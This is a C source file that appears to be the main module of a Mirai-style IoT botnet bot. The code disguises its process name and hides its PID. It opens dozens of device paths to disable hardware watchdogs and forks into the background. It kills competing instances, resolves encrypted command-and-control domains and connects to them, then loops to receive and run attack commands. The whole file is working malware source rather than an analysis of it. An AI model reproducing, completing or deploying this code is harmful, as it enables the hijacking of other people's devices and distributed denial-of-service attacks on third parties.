#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/rand.h"
#include "headers/tcp.h"
#include "headers/attack.h"
#include "headers/killer.h"
#include "headers/util.h"
#include "headers/resolv.h"
#include "headers/locker.h" 
 
//static void anti_gdb_entry(int);
//static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1;
BOOL pending_connection = FALSE;
ipv4_t LOCAL_ADDR;
void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("Got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif
 
void watchdogtmr() {
    int wfd;

    if ((wfd = open("/dev/watchdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/misc/watchdog", O_RDWR)) != -1 ||
        (wfd = open("/sbin/watchdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/FTWDT101_watchdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/FTWDT101/watchdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/watchdog0", O_RDWR)) != -1 ||
        (wfd = open("/etc/default/watchdog", O_RDWR)) != -1 ||
        (wfd = open("/etc/watchdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/watchdog1", O_RDWR)) != -1 ||
        (wfd = open("/dev/watchdog2", O_RDWR)) != -1 ||
        (wfd = open("/dev/watchdog3", O_RDWR)) != -1 ||
        (wfd = open("/dev/watchdog4", O_RDWR)) != -1 ||
        (wfd = open("/dev/watchdog5", O_RDWR)) != -1 ||
        (wfd = open("/dev/watchdog6", O_RDWR)) != -1 ||
        (wfd = open("/dev/watchdog7", O_RDWR)) != -1 ||
        (wfd = open("/dev/ssp/watchdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/epdc/watchdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/wdt", O_RDWR)) != -1 ||
        (wfd = open("/dev/uwdt", O_RDWR)) != -1 ||
        (wfd = open("/dev/softdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/mbox/watchdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/misc/watchdog0", O_RDWR)) != -1 ||
        (wfd = open("/dev/misc/watchdog1", O_RDWR)) != -1 ||
        (wfd = open("/dev/misc/watchdog2", O_RDWR)) != -1 ||
        (wfd = open("/dev/Watchdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/Watchdog0", O_RDWR)) != -1 ||
        (wfd = open("/dev/Watchdog1", O_RDWR)) != -1 ||
        (wfd = open("/dev/Watchdog2", O_RDWR)) != -1 ||
        (wfd = open("/dev/Watchdog3", O_RDWR)) != -1 ||
        (wfd = open("/dev/Watchdog4", O_RDWR)) != -1 ||
        (wfd = open("/dev/Watchdog5", O_RDWR)) != -1 ||
        (wfd = open("/dev/Watchdog6", O_RDWR)) != -1 ||
        (wfd = open("/dev/Watchdog7", O_RDWR)) != -1 ||
        (wfd = open("/dev/hdwatchdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/hdwatchdog0", O_RDWR)) != -1 ||
        (wfd = open("/dev/hdwatchdog1", O_RDWR)) != -1 ||
        (wfd = open("/dev/hdwatchdog2", O_RDWR)) != -1 ||
        (wfd = open("/dev/hdwatchdog3", O_RDWR)) != -1 ||
        (wfd = open("/dev/hdwatchdog4", O_RDWR)) != -1 ||
        (wfd = open("/dev/hdwatchdog5", O_RDWR)) != -1 ||
        (wfd = open("/dev/hdwatchdog6", O_RDWR)) != -1 ||
        (wfd = open("/dev/hdwatchdog7", O_RDWR)) != -1 ||
        (wfd = open("/dev/hdwatchdog8", O_RDWR)) != -1 ||
        (wfd = open("/dev/hdwatchdog9", O_RDWR)) != -1 ||
        (wfd = open("/dev/wwdt", O_RDWR)) != -1 ||
        (wfd = open("/dev/fw/watchdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/fw/wd", O_RDWR)) != -1 ||
        (wfd = open("/dev/earlywatchdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/extwatchdog", O_RDWR)) != -1 ||
        (wfd = open("/dev/earlywd", O_RDWR)) != -1 ||
        (wfd = open("/dev/extwd", O_RDWR)) != -1) 
    {

        #ifdef DEBUG
        printf("Opened watchdog device: %d\n", wfd);
        #endif
 
        int one = 1;
        ioctl(wfd, 0x80045704, &one);

        #ifdef DEBUG
        printf("Sent ioctl to watchdog device\n");
        #endif

        close(wfd);

        #ifdef DEBUG
        printf("Closed watchdog device\n");
        #endif

        wfd = 0;
    } else {

        #ifdef DEBUG
        printf("Failed to open any watchdog device\n");
        #endif
    }
}

void startkilershi() {

    /*broke: 
    BOOL frozen = FALSE;
  
    int locker_pipe[2] = {0};

    if (pipe(locker_pipe) == -1) 

    #ifdef DEBUG
    printf("Error opening pipe\n");
    #endif

    locker_init(locker_pipe);

    close(locker_pipe[1]);

    int locker_pid = 0;
    read(locker_pipe[0], &locker_pid, sizeof(locker_pid));
    close (locker_pipe[0]);
    */
      
    killer_init();
}
   
int main(int argc, char **args)
{
    rename(args[0], "   ");
    prctl(PR_SET_NAME, (unsigned long) "   ", 0, 0, 0);

    strcpy(args[0],"   "); 
       
    char *tbl_exec_succ;
    char name_buf[32];
    char id_buf[32];
    int name_buf_len;
    int tbl_exec_succ_len;
    int pgid, pings = 0;

#ifndef DEBUG
    sigset_t sigs;
    // Signal based control flow
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGCHLD, SIG_IGN);
    //signal(SIGTRAP, &anti_gdb_entry);

    // Prevent watchdog from rebooting device
    watchdogtmr();
    
    chdir("/");
#endif
 
#ifdef DEBUG
    printf("DEBUG MODE BLEH :PPPPP\n");

    sleep(1);

    struct sigaction sa;

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        perror("sigaction");

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGBUS, &sa, NULL) == -1)
        perror("sigaction");
#endif

    LOCAL_ADDR = util_local_addr();

    table_init();
    rand_init();
    ensure_single_instance();

    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }
 
    // Print out system exec
    char *message = "zenci";
    write(STDOUT, message, util_strlen(message));
    write(STDOUT, "\n", 1);

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    hidepid(getpid());
    startkilershi();
    attack_init();
  
    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG
            printf("[main] Detected newer instance running! Killing self\n");
#endif
            attack_kill_all();
            kill(pgid * -1, 9);
            teardown_connection();
            exit(0);
        }

        // Check if CNC connection was established or timed out or errored
        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
#ifdef DEBUG
                printf("[main] Timed out while connecting to CNC\n");
#endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
#ifdef DEBUG
                    printf("[main] Error while connecting to CNC code=%d\n", err);
#endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                    if (id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
#ifdef DEBUG
                    printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
#endif
                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n;
            uint16_t len;
            char rdbuf[1024];

            // Try to read in buffer length from CNC
            errno = 0;
            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1) {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else {
#ifdef DEBUG
                    printf("[main]: lost connection with CNC (errno: %d, stat: 1)\n", errno);
#endif
                    teardown_connection();
                }
            }

            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] Lost connection with CNC (errno: %d, stat: 1)\n", errno);
#endif
                teardown_connection();
                continue;
            }

            // Convert length to network order and sanity check length
            if (len == 0) // If it is just a ping, no need to try to read in buffer data
            {
                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL); // skip buffer for length
                continue;
            }
            len = ntohs(len);
            if (len > sizeof (rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
            }

            // Try to read in buffer from CNC
            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1) {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else {
#ifdef DEBUG
                    printf("[main]: Lost connection with CNC (errno: %d, stat: 2)\n", errno);
#endif
                    teardown_connection();
                }
            }

            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] Lost connection with CNC (errno: %d, stat: 2)\n", errno);
#endif
                teardown_connection();
                continue;
            }

            // Actually read buffer length and buffer data
            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
            printf("[main] Received %d bytes from CNC\n", len);
#endif

            if (n <= 0) {
#ifdef DEBUG
                printf("[main]: recv() failed, closing fd_serv\n");
#endif
                teardown_connection();
                continue;
            }

            if (len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}

/*
static int resolve_cnc_addr()
{
    srv_addr.sin_family = AF_INET;
    struct resolv_entries *entries = NULL;

    const char *backup_domains[] = {
        enc[TABLE_CNCDOMAIN].string,
        enc[TABLE_CNCDOMAIN1].string,
        enc[TABLE_CNCDOMAIN2].string,
        enc[TABLE_CNCDOMAIN3].string,
       

    };

    size_t num_domains = sizeof(backup_domains) / sizeof(backup_domains[0]);
    srand(time(NULL));

    // Move trough backup domains randomly
    for (size_t i = 0; i < num_domains - 1; ++i) {
        size_t j = i + rand() / (RAND_MAX / (num_domains - i) + 1);
        const char *temp = backup_domains[j];
        backup_domains[j] = backup_domains[i];
        backup_domains[i] = temp;
    }
    
    for (size_t i = 0; i < num_domains; ++i) {
        const char* current_domain = backup_domains[i];

        #ifdef DEBUG
        printf("Attempting to resolve \"%s\"\n", current_domain);
        #endif

        entries = resolv_lookup(current_domain);
        if (entries != NULL) {
            #ifdef DEBUG
            printf("Successfully resolved \"%s\"\n", current_domain);
            #endif
            break;  // If resolved successfully, break out of the loop
        } else {
            #ifdef DEBUG
            printf("Failed to resolve \"%s\"\n", current_domain);
            #endif
            continue;  // Try the next domain in the loop
        }
    }
    if (entries == NULL) {
        #ifdef DEBUG
        printf("Failed to resolve any domain\n");
        #endif
        return 1;
    }

    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    #ifdef DEBUG
    printf("Connecting to CNC with IP address: %s\n", inet_ntoa(srv_addr.sin_addr));
    #endif
    resolv_entries_free(entries);

    #ifdef DEBUG
    printf("Connecting to CNC with port %d\n", CNC_PORT);
    #endif

    srv_addr.sin_port = htons(CNC_PORT);
    
    return 0;
}
*/

/*
static int resolve_cnc_addr()
{
    srv_addr.sin_family = AF_INET;
    struct resolv_entries *entries = NULL;

    table_unlock_val(TABLE_CNC_DOMAIN1);
    table_unlock_val(TABLE_CNC_DOMAIN2);
    table_unlock_val(TABLE_CNC_DOMAIN3);
    table_unlock_val(TABLE_CNC_DOMAIN4);

    const char *backup_domains[] = {
        table_retrieve_val(TABLE_CNC_DOMAIN1, NULL),
        table_retrieve_val(TABLE_CNC_DOMAIN2, NULL),
        table_retrieve_val(TABLE_CNC_DOMAIN3, NULL),
        table_retrieve_val(TABLE_CNC_DOMAIN4, NULL),
    };
 
    table_lock_val(TABLE_CNC_DOMAIN1);
    table_lock_val(TABLE_CNC_DOMAIN2);
    table_lock_val(TABLE_CNC_DOMAIN3);
    table_lock_val(TABLE_CNC_DOMAIN4);

    size_t num_domains = sizeof(backup_domains) / sizeof(backup_domains[0]);
    srand(time(NULL));

    for (size_t i = 0; i < num_domains - 1; ++i) {
        size_t j = i + rand() / (RAND_MAX / (num_domains - i) + 1);
        const char *temp = backup_domains[j];
        backup_domains[j] = backup_domains[i];
        backup_domains[i] = temp;
    }
    
    for (size_t i = 0; i < num_domains; ++i) {
        const char* current_domain = backup_domains[i];

        #ifdef DEBUG
        printf("Attempting to resolve \"%s\"\n", current_domain);
        #endif

        entries = resolv_lookup(current_domain);
        if (entries != NULL) {
            #ifdef DEBUG
            printf("Successfully resolved \"%s\"\n", current_domain);
            #endif
            break;  
        } else {
            #ifdef DEBUG
            printf("Failed to resolve \"%s\"\n", current_domain);
            #endif
            continue; 
        }
    }

    if (entries == NULL) {
        #ifdef DEBUG
        printf("Failed to resolve any domain\n");
        #endif
        return 1;
    }

    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    #ifdef DEBUG
    printf("Connecting to CNC with IP address: %s\n", inet_ntoa(srv_addr.sin_addr));
    #endif
    resolv_entries_free(entries);

    #ifdef DEBUG
    printf("Connecting to CNC with port %d\n", CNC_PORT);
    #endif

    srv_addr.sin_port = htons(CNC_PORT);
     
    return 0;
}
*/
 
static int resolve_cnc_addr()
{
    srv_addr.sin_family = AF_INET;
    struct resolv_entries *entries = NULL;

    table_unlock_val(TABLE_CNC_DOMAIN1);
    table_unlock_val(TABLE_CNC_DOMAIN2);
    table_unlock_val(TABLE_CNC_DOMAIN3);
    table_unlock_val(TABLE_CNC_DOMAIN4);

    const char *backup_domains[] = {
        table_retrieve_val(TABLE_CNC_DOMAIN1, NULL),
        table_retrieve_val(TABLE_CNC_DOMAIN2, NULL),
        table_retrieve_val(TABLE_CNC_DOMAIN3, NULL),
        table_retrieve_val(TABLE_CNC_DOMAIN4, NULL),
    };

    #ifdef DEBUG
    // Print the retrieved domain values
    printf("Retrieved domains:\n");
    for (size_t i = 0; i < sizeof(backup_domains) / sizeof(backup_domains[0]); i++)
    {
        printf("Domain %zu: %s\n", i + 1, backup_domains[i]);
    }
    #endif

    size_t num_domains = sizeof(backup_domains) / sizeof(backup_domains[0]);
    srand(time(NULL));

    for (size_t i = 0; i < num_domains - 1; ++i) {
        size_t j = i + rand() / (RAND_MAX / (num_domains - i) + 1);
        const char *temp = backup_domains[j];
        backup_domains[j] = backup_domains[i];
        backup_domains[i] = temp;
    }
    
    for (size_t i = 0; i < num_domains; ++i) {
        const char* current_domain = backup_domains[i];

        #ifdef DEBUG
        printf("Attempting to resolve \"%s\"\n", current_domain);
        #endif

        entries = resolv_lookup(current_domain);
        if (entries != NULL) {
            #ifdef DEBUG
            printf("Successfully resolved \"%s\"\n", current_domain);
            #endif
            break;  
        } else {
            #ifdef DEBUG
            printf("Failed to resolve \"%s\"\n", current_domain);
            #endif
            continue; 
        }
    }

    table_lock_val(TABLE_CNC_DOMAIN1);
    table_lock_val(TABLE_CNC_DOMAIN2);
    table_lock_val(TABLE_CNC_DOMAIN3);
    table_lock_val(TABLE_CNC_DOMAIN4);

    if (entries == NULL) {
        #ifdef DEBUG
        printf("Failed to resolve any domain\n");
        #endif
        return 1;
    }

    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    #ifdef DEBUG
    printf("Connecting to CNC with IP address: %s\n", inet_ntoa(srv_addr.sin_addr));
    #endif
    resolv_entries_free(entries);

    #ifdef DEBUG
    printf("Connecting to CNC with port %d\n", CNC_PORT);
    #endif

    srv_addr.sin_port = htons(CNC_PORT);
     
    return 0;
}
 
static void establish_connection(void)
{
#ifdef DEBUG
    printf("Attempting to connect to CNC\n");
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("Failed to call socket(). Errno = %d\n", errno);
#endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK);
    resolve_cnc_addr();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}
/*
static void establish_connection(void)
{
    #ifdef DEBUG
    printf("Attempting to connect to CNC\n");
    #endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {

        #ifdef DEBUG
        printf("Failed to call socket(). Errno = %d\n", errno);
        #endif

        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK);

    int alivetimer = 1;
    int idletimer = 15;
    int keepinvltimer = 10;
    int keepnum = 5; 

    setsockopt(fd_serv, SOL_SOCKET, SO_KEEPALIVE, &alivetimer, sizeof(alivetimer));
    setsockopt(fd_serv, IPPROTO_TCP, TCP_KEEPIDLE, &idletimer, sizeof(idletimer));
    setsockopt(fd_serv, IPPROTO_TCP, TCP_KEEPINTVL, &keepinvltimer, sizeof(keepinvltimer));
    setsockopt(fd_serv, IPPROTO_TCP, TCP_KEEPCNT, &keepnum, sizeof(keepnum));

    resolve_cnc_addr();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}*/
  
static void teardown_connection(void)
{
#ifdef DEBUG
    printf("[main] Tearing down connection to CNC!\n");
#endif

    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    sleep(1);
}

static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG
        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
#endif

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[main] Failed to connect to fd_ctrl to request process termination\n");
#endif
        }

        sleep(5);
        close(fd_ctrl);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance(); // Call again, so that we are now the control
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf("[main] Failed to call listen() on fd_ctrl\n");
            close(fd_ctrl);
            sleep(5);
            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
            ensure_single_instance();
#endif
        }
#ifdef DEBUG
        printf("[main] We are the only process on this system!\n");
#endif
    }
}
